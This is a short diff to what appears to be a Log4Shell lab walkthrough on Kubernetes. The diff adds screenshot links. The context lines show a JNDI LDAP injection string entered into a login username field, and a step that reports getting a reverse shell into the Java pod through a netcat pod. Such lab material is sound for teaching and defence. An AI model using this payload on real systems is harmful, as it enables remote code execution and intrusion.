@@ -107,10 +107,12 @@ kubectl -n java-ms get service java-ms-svc | awk '{print $4}'
 ```
 
 Type ${jndi:ldap://34.68.190.28:1389/a} in username field and click Login
+![](https://i.imgur.com/l6gv5VO.png)
 
 Note: 34.68.190.28 replace with your nc-svc external IP
 
 **Step 6:** Check netcat pod `nc-pod-679c75d5b7-4gkjl`. You will get a reverse shell to java pod.
+![](https://i.imgur.com/l6gv5VO.png)
 
 Note: Try hostname command, you can see hostname is the name of the java microservice pod.
 
